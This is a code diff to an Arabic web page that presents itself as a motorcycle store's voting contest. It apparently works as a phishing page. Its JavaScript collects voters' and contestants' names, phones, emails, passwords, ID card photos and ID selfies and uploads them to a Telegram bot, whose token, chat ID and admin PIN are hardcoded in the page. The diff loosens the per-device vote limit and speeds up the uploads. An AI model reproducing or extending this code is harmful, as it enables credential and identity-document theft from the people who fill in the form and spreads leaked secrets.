@@ -50,11 +50,11 @@
     z-index: 9999;
     display: flex; align-items: center; justify-content: center;
     padding: 20px;
-    animation: fadeInModal 0.35s ease forwards;
+    animation: fadeInModal 0.3s ease forwards;
   }
 
   @keyframes fadeInModal {
-    from { opacity: 0; transform: scale(0.92); }
+    from { opacity: 0; transform: scale(0.94); }
     to { opacity: 1; transform: scale(1); }
   }
 
@@ -87,7 +87,7 @@
     padding: 14px 28px; border-radius: 50px;
     border: none; cursor: pointer; width: 100%;
     box-shadow: 0 10px 25px var(--primary-glow);
-    transition: 0.3s;
+    transition: 0.2s;
   }
   .modal-btn.secondary {
     background: rgba(245, 158, 11, 0.15);
@@ -123,7 +123,7 @@
   .nav-links a {
     text-decoration: none; color: var(--text-muted);
     font-size: 14px; font-weight: 700;
-    padding: 8px 16px; border-radius: 30px; transition: 0.3s;
+    padding: 8px 16px; border-radius: 30px; transition: 0.2s;
   }
   .nav-links a:hover { color: #fff; background: rgba(255, 255, 255, 0.08); }
   .nav-links a.cta-pill { background: var(--grad-tech); color: #fff; }
@@ -165,7 +165,7 @@
     background: rgba(16, 185, 129, 0.15);
     border: 1px solid var(--success);
     color: #6ee7b7; padding: 7px 18px; border-radius: 50px;
-    font-size: 13px; font-weight: 800; transition: transform 0.25s ease;
+    font-size: 13px; font-weight: 800; transition: transform 0.2s ease;
   }
 
   .pulse-dot {
@@ -228,7 +228,7 @@
     border: 1px solid rgba(56, 189, 248, 0.25);
     border-radius: 18px; padding: 14px 18px;
     display: flex; align-items: center; justify-content: space-between;
-    gap: 12px; transition: 0.3s;
+    gap: 12px; transition: 0.2s;
   }
 
   .leader-item.top-1 {
@@ -265,7 +265,6 @@
   }
   .quick-vote-btn:hover { transform: scale(1.05); }
 
-  /* أدوات الإدارة مخفية عن المصوِّت وتظهر فقط في وضع الإدارة */
   .admin-only-control {
     display: none;
   }
@@ -279,7 +278,6 @@
     font-size: 11px; font-weight: 800; cursor: pointer; margin-top: 5px;
   }
 
-  /* بطاقة الشكر باسم المحل بعد التصويت */
   .store-thanks-card {
     display: none;
     margin-top: 18px;
@@ -288,7 +286,7 @@
     border-radius: 20px;
     padding: 20px;
     text-align: center;
-    animation: fadeInModal 0.35s ease forwards;
+    animation: fadeInModal 0.3s ease forwards;
   }
   .store-thanks-card h4 {
     color: #6ee7b7;
@@ -328,7 +326,7 @@
   .field input, .field select, .field textarea {
     width: 100%; padding: 14px 16px;
     border: 1.5px solid var(--border); border-radius: 15px;
-    font-size: 14.5px; background: #050b1a; color: #fff; transition: 0.25s;
+    font-size: 14.5px; background: #050b1a; color: #fff; transition: 0.2s;
   }
   .field input:focus, .field select:focus, .field textarea:focus {
     outline: none; border-color: var(--cyan);
@@ -343,7 +341,6 @@
     cursor: pointer; font-size: 13px; font-weight: 700;
   }
 
-  /* تنبيهات محترمة ضد الاحتيال والتلاعب */
   .warning-notice {
     background: rgba(239, 68, 68, 0.12);
     border: 1px solid var(--danger);
@@ -356,7 +353,7 @@
     background: rgba(5, 11, 26, 0.9);
     border: 2px dashed rgba(245, 158, 11, 0.6);
     border-radius: 20px; padding: 18px; text-align: center;
-    cursor: pointer; transition: 0.3s; margin-bottom: 14px;
+    cursor: pointer; transition: 0.2s; margin-bottom: 14px;
   }
   .upload-box:hover { border-color: var(--gold); }
   .upload-box input[type="file"] { display: none; }
@@ -376,10 +373,10 @@
     border: none; border-radius: 18px;
     background: var(--grad-tech); color: #fff;
     font-size: 19px; font-weight: 900; cursor: pointer;
-    box-shadow: 0 14px 35px var(--primary-glow); transition: 0.3s;
+    box-shadow: 0 14px 35px var(--primary-glow); transition: 0.2s;
   }
   .btn-enter.gold-btn { background: var(--grad-gold); color: #030712; box-shadow: 0 14px 35px var(--gold-glow); }
-  .btn-enter:hover { transform: translateY(-3px); }
+  .btn-enter:hover { transform: translateY(-2px); }
   .btn-enter:disabled { opacity: 0.6; cursor: not-allowed; }
 
   .msg {
@@ -389,7 +386,6 @@
   .err { display: block; background: rgba(239, 35, 60, 0.18); color: #ff8fa3; border: 1px solid #ef233c; }
   .ok-msg { display: block; background: rgba(16, 185, 129, 0.18); color: #6ee7b7; border: 1px solid var(--success); }
 
-  /* ===== تذكرة النجاح ورسالة المشاركة المرتبة ===== */
   #ticketBox {
     display: none; text-align: center; padding: 40px 22px;
     background: linear-gradient(145deg, #062338 0%, #030d1a 100%);
@@ -420,13 +416,12 @@
     font-weight: 900; font-size: 15.5px; cursor: pointer; margin-top: 8px;
   }
 
-  /* ===== أقسام المترات والموقع ===== */
   .categories-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
   .cat-card {
     background: var(--grad-glass); border: 1px solid var(--border);
-    border-radius: 24px; padding: 26px 20px; text-align: center; transition: 0.3s;
+    border-radius: 24px; padding: 26px 20px; text-align: center; transition: 0.2s;
   }
-  .cat-card:hover { transform: translateY(-6px); border-color: var(--cyan); }
+  .cat-card:hover { transform: translateY(-5px); border-color: var(--cyan); }
   .cat-card.featured { border: 2px solid rgba(245, 158, 11, 0.7); }
   .cat-icon { font-size: 46px; margin-bottom: 12px; display: block; }
   .cat-card h3 { font-size: 20px; font-weight: 800; color: var(--gold-bright); margin-bottom: 8px; }
@@ -491,32 +486,32 @@
 <header>
   <div class="store-badge">🏆 المعرض العصري الأول للدراجات النارية في القاعدة</div>
   <h1>متجر <span>أمير المترات</span><br>ساحة المنافسة الحية والتصويت المباشر على فلينج!</h1>
-  <p class="subtitle">تحديث لحظي ومباشر للأصوات بدون أي مواقع خارجية — يضم <strong>50 متسابقاً</strong> (حتى 100 متسابق) مع أصوات أولية لكل متسابق وترتيب تلقائي فوري في بوت التليجرام.</p>
+  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري لبوت التليجرام.</p>
 </header>
 
 <!-- ===== قسم التصويت والمشاهدة المباشرة ===== -->
 <section id="voting">
   <div class="section-head">
-    <span class="sub">تحديث حي ومباشر كل 10 ثوانٍ</span>
+    <span class="sub">أداء سريع ووصول فوري للبوت</span>
     <h2>🗳️ ساحة التصويت ومشاهدة النتائج المباشرة</h2>
   </div>
 
   <div class="voting-section-box">
     <div class="live-status-bar">
-      <div class="live-pill"><span class="pulse-dot"></span> بث مباشر للنتائج (يتحدث تلقائياً)</div>
+      <div class="live-pill"><span class="pulse-dot"></span> التصويت متاح لجميع الأجهزة ببيانات مستقلة</div>
       <div class="live-pill" style="border-color:var(--cyan); color:var(--cyan);" id="capacityCounter">👥 المتسابقون: 50/100 • 🗳️ إجمالي الأصوات: 0</div>
     </div>
 
     <div class="warning-notice" style="margin-bottom:24px;">
       <span class="icon">🛡️</span>
-      <p><strong>تنبيه مهم ضد الاحتيال والتلاعب:</strong> حرصاً منا على النزاهة والعدالة بين جميع المتسابقين، يُمنع منعاً باتاً أي محاولة احتيال أو انتحال أو استخدام بيانات أو وثائق غير صحيحة أو تكرار التصويت. أي مخالفة أو شبهة تلاعب تؤدي فوراً إلى رفض الصوت أو استبعاد المتسابق وإلغاء الأصوات المخالفة دون تهاون.</p>
+      <p><strong>تنبيه مهم ضد الاحتيال والتلاعب:</strong> يُسمح بالتصويت من أي جهاز عند استخدام رقم وبريد ووثيقة مختلفة، ولكن يُمنع منعاً باتاً تكرار نفس الرقم أو البريد أو إرفاق وثائق/بيانات مزورة أو انتحال الهوية. أي محاولة احتيال أو تلاعب تؤدي فوراً لرفض الصوت واستبعاد المخالف وحذف الأصوات المخالفة.</p>
     </div>
 
     <div class="vote-grid">
       <!-- نموذج التصويت -->
       <div class="vote-card-panel">
         <h3>✍️ صوّت لمتسابقك المفضل الآن</h3>
-        <p class="desc">اختر المتسابق من القائمة أو أدخل رمزه، وأكمل بياناتك مع إرفاق صورة البطاقة أو الجواز:</p>
+        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
 
         <div id="directInviteBanner" class="direct-invite-banner">
           🎯 أنت تصوّت الآن عبر رابط الدعوة المباشر للمتسابق:<br>
@@ -567,7 +562,7 @@
               <div class="upload-label">
                 <span class="upload-icon">🆔</span>
                 <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
-                <span class="upload-sub">تُرسل للإدارة للتحقق ومنع الاحتيال</span>
+                <span class="upload-sub">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</span>
               </div>
               <input type="file" id="voterIdImage" accept="image/*" required onchange="handleImage(event, 'voterIdPreview')">
               <img id="voterIdPreview" class="preview-img" alt="معاينة هوية المصوت">
@@ -602,7 +597,7 @@
         <input type="text" id="searchCandidateInput" class="search-filter-input" placeholder="🔍 ابحث عن اسم متسابق أو رمز (مثال: خلدون أو AMIR-7272)..." oninput="renderLeaderboardUI()">
 
         <div class="leaderboard-list" id="leaderboardList">
-          <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ مزامنة قائمة المتسابقين والأصوات المباشرة...</div>
+          <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
         </div>
 
         <!-- شريط الإدارة (أزرار الفحص والتقرير تظهر فقط داخل وضع الإدارة) -->
@@ -779,15 +774,13 @@
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 const ADMIN_PIN = "777908028";
+const STORAGE_KEY = "amir_cloud_fast_v6";
 
 const MAX_CANDIDATES = 100;
-const MAX_VOTES      = 100000;
 
 let compressedIdBlob = null;
 let compressedSelfieBlob = null;
 let compressedVoterIdBlob = null;
-let currentGeneratedTicket = "";
-let currentGeneratedName = "";
 let captchaExpected = 8;
 
 function buildInitial50Candidates() {
@@ -824,10 +817,25 @@ function buildInitial50Candidates() {
   });
 }
 
-let cloudState = {
-  c: buildInitial50Candidates(),
-  h: []
-};
+function loadLocalState() {
+  try {
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved) {
+      const parsed = JSON.parse(saved);
+      if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
+        return { c: parsed.c, h: Array.isArray(parsed.h) ? parsed.h : [] };
+      }
+    }
+  } catch (e) {}
+  return { c: buildInitial50Candidates(), h: [] };
+}
+
+let cloudState = loadLocalState();
+
+function persistLocalState() {
+  cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(cloudState));
+}
 
 function generateCaptcha() {
   const a = Math.floor(Math.random() * 9) + 2;
@@ -847,6 +855,7 @@ function shortHash(str) {
   return Math.abs(hash).toString(36);
 }
 
+// مزامنة سريعة من السحابة دون إبطاء واجهة التصويت
 async function syncFromTelegramCloud(manualTrigger = false) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
@@ -859,15 +868,7 @@ async function syncFromTelegramCloud(manualTrigger = false) {
         const parsed = JSON.parse(match[1].trim());
         if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
           cloudState = parsed;
-          localStorage.setItem("amir_cloud_50_v5", JSON.stringify(cloudState));
-        }
-      }
-    } else {
-      const cached = localStorage.getItem("amir_cloud_50_v5");
-      if (cached) {
-        const parsedCache = JSON.parse(cached);
-        if (parsedCache && Array.isArray(parsedCache.c) && parsedCache.c.length > 0) {
-          cloudState = parsedCache;
+          persistLocalState();
         }
       }
     }
@@ -879,14 +880,10 @@ async function syncFromTelegramCloud(manualTrigger = false) {
       const counterEl = document.getElementById("capacityCounter");
       if (counterEl) {
         counterEl.style.transform = "scale(1.06)";
-        setTimeout(() => { counterEl.style.transform = "scale(1)"; }, 250);
+        setTimeout(() => { counterEl.style.transform = "scale(1)"; }, 200);
       }
     }
   } catch (err) {
-    const cached = localStorage.getItem("amir_cloud_50_v5");
-    if (cached) {
-      cloudState = JSON.parse(cached);
-    }
     renderLeaderboardUI();
   }
 }
@@ -901,15 +898,12 @@ function buildSortedTelegramLeaderboard(limit = 20) {
   return lines;
 }
 
-async function saveToTelegramCloud(newState) {
-  cloudState = newState;
-  cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
-  localStorage.setItem("amir_cloud_50_v5", JSON.stringify(cloudState));
-
+// تحديث السجل في الخلفية لعدم تأخير تجربة التصويت
+async function backgroundCloudSync() {
+  persistLocalState();
   try {
     const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const summaryLines = buildSortedTelegramLeaderboard(15);
-
+    const summaryLines = buildSortedTelegramLeaderboard(12);
     const payloadText =
 `📊 سجل المسابقة المرتب — متجر أمير المترات
 👥 المتسابقون: ${cloudState.c.length}/${MAX_CANDIDATES} | 🗳️ الأصوات: ${totalVotes}
@@ -924,7 +918,7 @@ ${JSON.stringify(cloudState)}
     const pinnedMsg = chatData?.result?.pinned_message;
 
     if (pinnedMsg && pinnedMsg.text && pinnedMsg.text.includes("#AMIR_DB#")) {
-      const editRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -932,35 +926,9 @@ ${JSON.stringify(cloudState)}
           message_id: pinnedMsg.message_id,
           text: payloadText
         })
-      });
-      const editData = await editRes.json();
-      if (editData.ok) return true;
-    }
-
-    const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: payloadText,
-        disable_notification: true
-      })
-    });
-    const sendData = await sendRes.json();
-    if (sendData.ok && sendData.result) {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/pinChatMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id: sendData.result.message_id,
-          disable_notification: true
-        })
       }).catch(() => {});
-      return true;
     }
   } catch (e) {}
-  return false;
 }
 
 function renderLeaderboardUI() {
@@ -1067,14 +1035,14 @@ function goToSection(sectionId) {
   const modal = document.getElementById("promoModal");
   if (modal) {
     modal.style.opacity = "0";
-    modal.style.transition = "opacity 0.3s ease";
-    setTimeout(() => { modal.style.display = "none"; }, 300);
+    modal.style.transition = "opacity 0.25s ease";
+    setTimeout(() => { modal.style.display = "none"; }, 250);
   }
   const target = document.getElementById(sectionId);
   if (target) target.scrollIntoView({ behavior: "smooth" });
 }
 
-// ===== معالجة التصويت: 1) صورة البطاقة + بيانات المصوت في رسالة قصيرة، 2) الترتيب المرتب في رسالة مستقلة =====
+// ===== تصويت سريع ومفتوح لجميع الأجهزة مع منع تكرار الرقم أو البريد فقط =====
 document.getElementById("voteForm").addEventListener("submit", async function(e) {
   e.preventDefault();
   const voteMsg = document.getElementById("voteMsg");
@@ -1096,58 +1064,41 @@ document.getElementById("voteForm").addEventListener("submit", async function(e)
     return;
   }
 
-  if (localStorage.getItem("amir_voted_device_50") === "true") {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "⚠️ عذراً، لقد تم تسجيل صوت سابق من هذا الجهاز، ويُسمح بصوت واحد فقط حفاظاً على نزاهة المسابقة.";
-    return;
-  }
-
   const rawCode = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
   const voterName = cleanHTML(document.getElementById("voterName").value.trim());
   const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, '');
   const voterEmail = document.getElementById("voterEmail").value.trim().toLowerCase();
   const voterPassword = cleanHTML(document.getElementById("voterPassword").value.trim());
 
+  const targetCand = cloudState.c.find(c => c.k === rawCode);
+  if (!targetCand) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "❌ رمز المتسابق غير موجود! تأكد من كتابة الرمز الصحيح.";
+    return;
+  }
+
+  if (targetCand.p && targetCand.p === voterPhone) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "🚫 نعتذر، لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المنافسة.";
+    return;
+  }
+
+  const phoneHash = shortHash(voterPhone);
+  const emailHash = shortHash(voterEmail);
+  if (cloudState.h.includes(phoneHash) || cloudState.h.includes(emailHash)) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
+    return;
+  }
+
   const btn = document.getElementById("voteSubmitBtn");
   btn.disabled = true;
-  btn.textContent = "⏳ جارٍ إرسال وثيقة المصوت وتحديث الترتيب للبوت...";
+  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للبوت...";
 
   try {
-    await syncFromTelegramCloud(false);
-
-    const targetCand = cloudState.c.find(c => c.k === rawCode);
-    if (!targetCand) {
-      voteMsg.className = "msg err";
-      voteMsg.textContent = "❌ رمز المتسابق غير موجود! تأكد من كتابة الرمز الصحيح.";
-      btn.disabled = false;
-      btn.textContent = "🗳️ اعتمد صوتي الآن";
-      return;
-    }
-
-    const myCode = localStorage.getItem("amir_my_ticket_code");
-    if ((myCode && myCode === rawCode) || (targetCand.p && targetCand.p === voterPhone)) {
-      voteMsg.className = "msg err";
-      voteMsg.textContent = "🚫 نعتذر، لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المنافسة.";
-      btn.disabled = false;
-      btn.textContent = "🗳️ اعتمد صوتي الآن";
-      return;
-    }
-
-    const phoneHash = shortHash(voterPhone);
-    const emailHash = shortHash(voterEmail);
-    if (cloudState.h.includes(phoneHash) || cloudState.h.includes(emailHash)) {
-      voteMsg.className = "msg err";
-      voteMsg.textContent = "🚫 نعتذر، رقم الهاتف أو البريد الإلكتروني هذا سبق له التصويت في المسابقة.";
-      btn.disabled = false;
-      btn.textContent = "🗳️ اعتمد صوتي الآن";
-      return;
-    }
-
     targetCand.v = (targetCand.v || 0) + 1;
     cloudState.h.push(phoneHash, emailHash);
-    cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
-
-    localStorage.setItem("amir_cloud_50_v5", JSON.stringify(cloudState));
+    persistLocalState();
     renderLeaderboardUI();
 
     const shortVoterCaption =
@@ -1193,9 +1144,8 @@ ${sortedLines}`;
       })
     }).catch(() => {});
 
-    saveToTelegramCloud(cloudState).catch(() => {});
+    backgroundCloudSync();
 
-    localStorage.setItem("amir_voted_device_50", "true");
     voteMsg.className = "msg ok-msg";
     voteMsg.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${targetCand.n} - ${rawCode}) وإرسال بياناتك للبوت!`;
 
@@ -1207,11 +1157,25 @@ ${sortedLines}`;
       thanksCard.style.display = "block";
       thanksCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
     }
-    btn.textContent = "✅ تم التصويت بنجاح";
+
+    // إعادة تهيئة حقول المصوت للسماح بتصويت شخص آخر برقم وبريد مختلف بسرعة
+    document.getElementById("voterName").value = "";
+    document.getElementById("voterPhone").value = "";
+    document.getElementById("voterEmail").value = "";
+    document.getElementById("voterPassword").value = "";
+    document.getElementById("captchaAnswer").value = "";
+    document.getElementById("voterIdImage").value = "";
+    compressedVoterIdBlob = null;
+    const prev = document.getElementById("voterIdPreview");
+    if (prev) prev.style.display = "none";
+    generateCaptcha();
+
+    btn.disabled = false;
+    btn.textContent = "🗳️ اعتمد صوتي الآن";
 
   } catch (err) {
     voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت وإعدادات البوت والمحاولة.";
+    voteMsg.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
     btn.disabled = false;
     btn.textContent = "🗳️ اعتمد صوتي الآن";
   }
@@ -1245,38 +1209,30 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
     return;
   }
 
+  if (cloudState.c.length >= MAX_CANDIDATES) {
+    msg.className = "msg err";
+    msg.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين في هذه المسابقة (100 متسابق).";
+    return;
+  }
+
+  const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
+  if (cloudState.c.some(c => c.p === rawPhone)) {
+    msg.className = "msg err";
+    msg.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
+    return;
+  }
+
   const btn = document.getElementById("btn");
   btn.disabled = true;
-  btn.textContent = "⏳ جارٍ التحقق من السعة وإصدار رابط التصويت الخاص بك...";
+  btn.textContent = "⚡ جارٍ إصدار رابط التصويت وإرسال الوثائق...";
 
   try {
-    await syncFromTelegramCloud(false);
-
-    if (cloudState.c.length >= MAX_CANDIDATES) {
-      msg.className = "msg err";
-      msg.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين في هذه المسابقة (100 متسابق).";
-      btn.disabled = false;
-      btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
-      return;
-    }
-
-    const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
-    if (cloudState.c.some(c => c.p === rawPhone)) {
-      msg.className = "msg err";
-      msg.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
-      btn.disabled = false;
-      btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
-      return;
-    }
-
     let ticketID = "";
     do {
       ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
     } while (cloudState.c.some(c => c.k === ticketID));
 
-    currentGeneratedTicket = ticketID;
     const participantName = cleanHTML(document.getElementById("name").value.trim());
-    currentGeneratedName = participantName;
     const email = cleanHTML(document.getElementById("email").value.trim());
     const password = cleanHTML(document.getElementById("password").value.trim());
     const city = cleanHTML(document.getElementById("city").value.trim());
@@ -1300,17 +1256,18 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
     fd1.append("photo", compressedIdBlob, "id_card.jpg");
     fd1.append("caption", captionText);
     fd1.append("parse_mode", "HTML");
-    const r1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd1 });
-    const d1 = await r1.json();
-    if (!d1.ok) throw new Error("Telegram Photo 1 failed");
 
     const fd2 = new FormData();
     fd2.append("chat_id", CHAT_ID);
     fd2.append("photo", compressedSelfieBlob, "selfie_id.jpg");
     fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${participantName} (${ticketID})`);
-    const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd2 });
-    const d2 = await r2.json();
-    if (!d2.ok) throw new Error("Telegram Photo 2 failed");
+
+    const [r1, r2] = await Promise.all([
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd1 }).then(r => r.json()),
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd2 }).then(r => r.json())
+    ]);
+
+    if (!r1.ok || !r2.ok) throw new Error("Telegram registration upload failed");
 
     cloudState.c.push({
       k: ticketID,
@@ -1320,10 +1277,9 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
       v: 0
     });
 
-    saveToTelegramCloud(cloudState).catch(() => {});
+    persistLocalState();
+    backgroundCloudSync();
     renderLeaderboardUI();
-
-    localStorage.setItem("amir_my_ticket_code", ticketID);
 
     const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${ticketID}#voting`;
     const inviteText = buildAttractiveInviteMessage(participantName, ticketID, shareUrl);
@@ -1388,19 +1344,14 @@ function toggleAdminMode() {
 
 async function deleteCandidateAdmin(code, name) {
   if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً من المسابقة؟`)) return;
-  try {
-    await syncFromTelegramCloud(false);
-    cloudState.c = cloudState.c.filter(c => c.k !== code);
-    await saveToTelegramCloud(cloudState);
-    renderLeaderboardUI();
-    alert(`✅ تم استبعاد المتسابق (${name}) وحذفه من لوحة المتصدرين فوراً.`);
-  } catch (e) {
-    alert("❌ حدث خطأ أثناء الحذف.");
-  }
+  cloudState.c = cloudState.c.filter(c => c.k !== code);
+  persistLocalState();
+  backgroundCloudSync();
+  renderLeaderboardUI();
+  alert(`✅ تم استبعاد المتسابق (${name}) وحذفه من لوحة المتصدرين فوراً.`);
 }
 
 async function sendSortedReportToBot() {
-  await syncFromTelegramCloud(false);
   if (cloudState.c.length === 0) {
     alert("لا يوجد متسابقون مسجلون حالياً.");
     return;
@@ -1444,6 +1395,7 @@ function toggleGenericPass(inputId, btnEl) {
   }
 }
 
+// ضغط سريع للصور (حد أقصى 900px وجودة 0.72) لسرعة فائقة في الرفع للبوت
 function handleImage(event, previewId) {
   const file = event.target.files[0];
   if (!file) return;
@@ -1453,7 +1405,7 @@ function handleImage(event, previewId) {
     img.onload = function() {
       const canvas = document.createElement("canvas");
       const ctx = canvas.getContext("2d");
-      const MAX = 1100;
+      const MAX = 900;
       let w = img.width, h = img.height;
       if (w > h && w > MAX) { h *= MAX / w; w = MAX; }
       else if (h > MAX) { w *= MAX / h; h = MAX; }
@@ -1466,7 +1418,7 @@ function handleImage(event, previewId) {
 
         const p = document.getElementById(previewId);
         if (p) { p.src = URL.createObjectURL(blob); p.style.display = "block"; }
-      }, "image/jpeg", 0.8);
+      }, "image/jpeg", 0.72);
     };
     img.src = e.target.result;
   };
@@ -1479,8 +1431,9 @@ function cleanHTML(str) {
 
 generateCaptcha();
 renderLeaderboardUI();
+checkUrlVoteParam();
 syncFromTelegramCloud(false);
-setInterval(() => syncFromTelegramCloud(false), 10000);
+setInterval(() => syncFromTelegramCloud(false), 15000);
 </script>
 
 </body>
